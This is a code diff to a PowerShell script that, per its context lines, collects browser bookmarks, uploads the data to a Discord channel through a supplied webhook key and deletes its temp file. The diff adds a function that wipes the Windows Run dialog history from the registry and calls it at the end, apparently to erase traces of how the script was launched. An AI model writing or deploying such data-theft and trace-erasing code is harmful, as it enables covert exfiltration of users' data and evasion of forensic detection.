@@ -105,6 +105,31 @@ function readBookmarks{
 $bookmark = readBookmarks
 $bookmark >> $FileName
 
+function clearRunHistory{
+    $runReg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
+    if (Get-ItemProperty $runReg | Select-Object -ExpandProperty "MRUList"){
+        $historyList = Get-ItemProperty $runReg | Select-Object -ExpandProperty "MRUList"
+        $histories = $historyList.ToCharArray()
+    
+        ForEach ($history in $histories){
+            if (Get-ItemProperty $runReg | Select-Object -ExpandProperty $history){
+                Remove-ItemProperty -Path $runReg -Name $history
+            } else {
+                Write-Host "Item already removed."
+            }
+        }
+    
+        if ($historyList){
+            Remove-ItemProperty -Path $runReg -Name "MRUList"
+        } else {
+            Write-Host "Item already removed."
+        }
+    }
+    else {
+        Write-Host "No RunMRU found."
+    }
+}
+
 <#
 .SYNOPSIS
 This function uploads the collected data to your Discord channel when an API key is provided as $dc.
@@ -140,3 +165,4 @@ if (-not ([string]::IsNullOrEmpty("$dc"))){
 
 # Clean up Temp file created.
 Remove-Item $FileName
+clearRunHistory
